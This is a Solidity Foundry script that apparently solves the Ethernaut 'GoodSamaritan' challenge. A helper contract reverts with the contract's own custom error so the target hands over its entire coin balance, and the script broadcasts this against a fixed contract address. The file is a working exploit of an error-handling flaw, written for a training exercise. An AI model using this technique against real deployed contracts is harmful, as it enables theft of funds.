// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GoodSamaritan.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Notified is INotifyable {
    error NotEnoughBalance();

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        } else {
            return;
        }
    }

    function attack(GoodSamaritan goodSamaritanInstance) external {
        goodSamaritanInstance.requestDonation();
    }
}

contract GoodSamaritanSolution is Script {
    GoodSamaritan constant goodSamaritanInstance =
        GoodSamaritan(0x91A3aAc989fB737a9df93A1CB98830f3C3cc0907);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Notified notified = new Notified();
        notified.attack(goodSamaritanInstance);
        require(
            Coin(goodSamaritanInstance.coin()).balances(address(notified)) ==
                10 ** 6
        );
        vm.stopBroadcast();
    }
}
